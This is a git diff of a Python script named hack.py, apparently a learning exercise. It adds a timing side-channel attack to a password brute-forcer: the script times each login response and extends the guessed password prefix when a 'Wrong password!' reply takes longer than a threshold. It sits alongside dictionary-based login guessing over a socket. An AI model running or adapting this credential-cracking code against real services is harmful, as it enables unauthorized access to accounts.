@@ -3,6 +3,7 @@ import socket
 import sys
 import string
 import json
+from time import time
 
 
 def password_generator(length=1000000) -> str:
@@ -75,17 +76,24 @@ def hack_password(login, password_beginning=""):
             password = password_beginning + password
         message = {"login": login, "password": password}
         # reading response from server
+        start = time()
         response = send_and_recv_json_request(json.dumps(message))
-        if json.loads(response)["result"] == "Exception happened during login":
+        end = time()
+        processing_time = (end - start) * 10_000_000
+        logs.write(f"result :{json.loads(response)['result']}  {processing_time}\n")
+
+        if json.loads(response)["result"] == "Wrong password!" and processing_time > 90000:
             return hack_password(login, password_beginning=password)
         if json.loads(response)["result"] == "Connection success!":
             print(json.dumps(message))
             exit()
 
 
-def main():
+logs = open("logs.txt", "a")
+
+
+def main(logs):
     args = sys.argv
-    # args = ['hack.py', 'localhost', 9090]
     if len(args) < 3:
         print("Not enough arguments. Please provide : ip_address, port, message")
         exit()
@@ -95,7 +103,6 @@ def main():
     client_socket = socket.socket()
     client_socket.connect((ip_address, port))  # connect takes the tuple as an argument
     dictionary_file = "hacking/logins.txt"
-    # try_dictionary_password(dictionary_file, client_socket)
     login = hack_login(dictionary_file)
     if not login:
         print("sorry, no more logins in DB file")
@@ -103,7 +110,11 @@ def main():
         hack_password(login)
 
     client_socket.close()  # close connection
+    logs.close()
 
 
 if __name__ == '__main__':
-    main()
+    client_socket = ''
+    main(logs)
+
+# (final - start).microseconds >= 90000
